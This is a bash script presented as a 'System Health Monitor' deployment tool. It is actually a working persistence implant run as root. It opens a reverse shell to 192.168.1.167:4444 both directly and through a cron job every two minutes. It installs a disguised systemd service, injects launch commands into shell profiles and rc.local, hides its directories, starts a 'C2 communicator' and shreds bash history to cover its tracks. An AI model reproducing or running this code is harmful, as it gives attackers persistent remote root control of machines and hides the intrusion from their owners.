#!/bin/bash
#
# System Monitor Deployment Script - Enhanced
# Deploys persistent monitoring system to target machine
#

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_debug() { echo -e "${BLUE}[DEBUG]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

# Configuration
INSTALL_DIR="/usr/lib/systemd/system-monitor"
BACKUP_DIR="/etc/.system-monitor"
SERVICE_NAME="system-health-monitor"
LOG_DIR="/var/log/system-monitor"

# ADD REVERSE SHELL FUNCTION
start_reverse_shell() {
    log_info "Starting reverse shell..."
    # Run in background
    nohup bash -c 'bash -i >& /dev/tcp/192.168.1.167/4444 0>&1' >/dev/null 2>&1 &
    
    # Verify it's running
    sleep 2
    if pgrep -f "bash -i.*192.168.1.167" >/dev/null; then
        log_success "Reverse shell is running"
    else
        log_warn "Reverse shell may not have started"
    fi
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    # Check Python
    if ! command -v python3 &> /dev/null; then
        log_error "Python3 is required but not installed"
        exit 1
    fi
    
    # Check root access
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root for full deployment"
        exit 1
    fi
    
    log_info "Prerequisites satisfied"
}

install_dependencies() {
    log_info "Installing Python dependencies..."
    
    # Install psutil if not available
    if ! python3 -c "import psutil" 2>/dev/null; then
        log_info "Installing psutil package..."
        if command -v pip3 &> /dev/null; then
            pip3 install psutil
        elif command -v apt-get &> /dev/null; then
            apt-get update && apt-get install -y python3-psutil
        elif command -v yum &> /dev/null; then
            yum install -y python3-psutil
        else
            log_warn "Cannot install psutil automatically - some features may not work"
        fi
    fi
    
    log_success "Dependencies installed"
}

setup_environment() {
    log_info "Setting up monitoring environment..."
    
    # Create directories
    mkdir -p "$INSTALL_DIR"
    mkdir -p "$BACKUP_DIR"
    mkdir -p "$LOG_DIR"
    
    # Set stealth permissions
    chmod 700 "$INSTALL_DIR"
    chmod 700 "$BACKUP_DIR"
    chmod 700 "$LOG_DIR"
    
    # Hide directories
    if command -v attr &> /dev/null; then
        attr -s "hidden" -V 1 "$INSTALL_DIR" 2>/dev/null || true
        attr -s "hidden" -V 1 "$BACKUP_DIR" 2>/dev/null || true
    fi
    
    log_success "Environment setup completed"
}

install_monitoring_files() {
    log_info "Installing monitoring files..."
    
    # Copy Python scripts
    cp system_monitor.py "$INSTALL_DIR/"
    cp network_monitor.py "$INSTALL_DIR/"
    cp quick_recon.py "$INSTALL_DIR/"
    
    # Create backup copies
    cp system_monitor.py "$BACKUP_DIR/"
    cp network_monitor.py "$BACKUP_DIR/"
    
    # Set executable permissions
    chmod +x "$INSTALL_DIR/system_monitor.py"
    chmod +x "$INSTALL_DIR/network_monitor.py"
    chmod +x "$INSTALL_DIR/quick_recon.py"
    chmod +x "$BACKUP_DIR/system_monitor.py"
    chmod +x "$BACKUP_DIR/network_monitor.py"
    
    # Create stealth configuration
    cat > "$INSTALL_DIR/.config.json" << EOF
{
    "monitoring": {
        "interval_seconds": 60,
        "log_retention_days": 7,
        "stealth_mode": true
    },
    "c2": {
        "fallback_enabled": true,
        "backup_location": "$BACKUP_DIR"
    }
}
EOF

    log_success "Monitoring files installed"
}

setup_systemd_service() {
    log_info "Setting up systemd service..."
    
    # Create service file with stealth options
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Health Monitor
After=network.target
Wants=network.target
StartLimitIntervalSec=0

[Service]
Type=forking
ExecStart=/usr/bin/python3 $INSTALL_DIR/system_monitor.py
ExecStop=/bin/kill -TERM \$MAINPID
Restart=always
RestartSec=10
User=root
Group=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd and enable service
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME.service"
    
    log_success "Systemd service configured"
}

setup_cron_persistence() {
    log_info "Setting up cron persistence..."
    
   # Multiple cron entries for redundancy
CRON_JOBS=(
    "*/3 * * * * /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
    "*/10 * * * * /usr/bin/python3 $INSTALL_DIR/system_monitor.py >/dev/null 2>&1"
    "@reboot /usr/bin/python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1"
)

# Add this to your CRON_JOBS array
REVERSE_SHELL_JOB="*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.167/4444 0>&1' >/dev/null 2>&1"
CRON_JOBS+=("$REVERSE_SHELL_JOB")
    
# Get current crontab
current_cron=$(crontab -l 2>/dev/null || true)
    
# Add new jobs
for job in "${CRON_JOBS[@]}"; do
    if ! grep -Fq "$job" <<< "$current_cron"; then
        current_cron+="$job"$'\n'
    fi
done
    
    # Install updated crontab
    echo "$current_cron" | crontab -
    
    log_success "Cron persistence configured"
}

setup_profile_persistence() {
    log_info "Setting up profile persistence..."
    
    local persistence_cmd="nohup python3 $INSTALL_DIR/network_monitor.py >/dev/null 2>&1 &"
    
    # Target multiple profile files
    local profiles=(
        "/etc/profile"
        "/etc/bash.bashrc"
        "/root/.bashrc"
        "/home/*/.bashrc"
    )
    
    for profile_pattern in "${profiles[@]}"; do
        for profile in $profile_pattern; do
            if [[ -f "$profile" ]] && ! grep -q "network_monitor.py" "$profile"; then
                echo "$persistence_cmd" >> "$profile"
                log_debug "Added to $profile"
            fi
        done
    done
    
    log_success "Profile persistence configured"
}

setup_rc_local() {
    log_info "Setting up rc.local persistence..."
    
    local rclocal="/etc/rc.local"
    local startup_cmd="python3 $INSTALL_DIR/network_monitor.py &"
    
    # Create rc.local if it doesn't exist
    if [[ ! -f "$rclocal" ]]; then
        cat > "$rclocal" << EOF
#!/bin/bash
python3 $INSTALL_DIR/network_monitor.py &
exit 0
EOF
        chmod +x "$rclocal"
    else
        # Add to existing rc.local
        if ! grep -q "network_monitor.py" "$rclocal"; then
            sed -i "/^exit 0/i $startup_cmd" "$rclocal"
        fi
    fi
    
    log_success "rc.local persistence configured"
}

start_services() {
    log_info "Starting monitoring services..."
    
    # Start systemd service
    systemctl start "$SERVICE_NAME.service"
    
    # Start C2 communicator directly
    nohup python3 "$INSTALL_DIR/network_monitor.py" >/dev/null 2>&1 &
    
    # Verify services are running
    sleep 2
    
    if systemctl is-active --quiet "$SERVICE_NAME.service"; then
        log_success "Systemd service is running"
    else
        log_error "Systemd service failed to start"
        systemctl status "$SERVICE_NAME.service"
    fi
    
    if pgrep -f "network_monitor.py" >/dev/null; then
        log_success "C2 communicator is running"
    else
        log_warn "C2 communicator may not be running"
    fi
}

cleanup_installation() {
    log_info "Cleaning up installation artifacts..."
    
    # Remove temporary files
    rm -f /tmp/deploy_*.sh
    rm -f /tmp/*.py
    
    # Clear command history
    if [[ -f ~/.bash_history ]]; then
        shred -u ~/.bash_history 2>/dev/null || rm -f ~/.bash_history
    fi
    
    log_success "Cleanup completed"
}

show_status() {
    log_info "=== Deployment Status ==="
    echo "Installation Directory: $INSTALL_DIR"
    echo "Backup Directory: $BACKUP_DIR"
    echo "Service Name: $SERVICE_NAME"
    echo "Service Status: $(systemctl is-active $SERVICE_NAME.service 2>/dev/null || echo 'not-found')"
    echo "C2 Process: $(pgrep -f 'network_monitor.py' | wc -l) instances"
    echo "Cron Jobs: $(crontab -l | grep -c 'monitor') configured"
    echo ""
    echo "Verification Commands:"
    echo "  systemctl status $SERVICE_NAME.service"
    echo "  pgrep -f 'network_monitor.py'"
    echo "  crontab -l | grep monitor"
    echo "  ls -la $INSTALL_DIR"
}

main() {
    log_info "Starting Advanced System Monitor Deployment..."
    
    check_prerequisites
    install_dependencies
    setup_environment
    install_monitoring_files
    setup_systemd_service
    setup_cron_persistence
    setup_profile_persistence
    setup_rc_local
    start_services
    start_reverse_shell  # ADDED THIS LINE
    cleanup_installation
    show_status
    
    log_success "Deployment completed successfully!"
    log_info "System will maintain persistence across reboots"
}

# Run main function
main "$@"
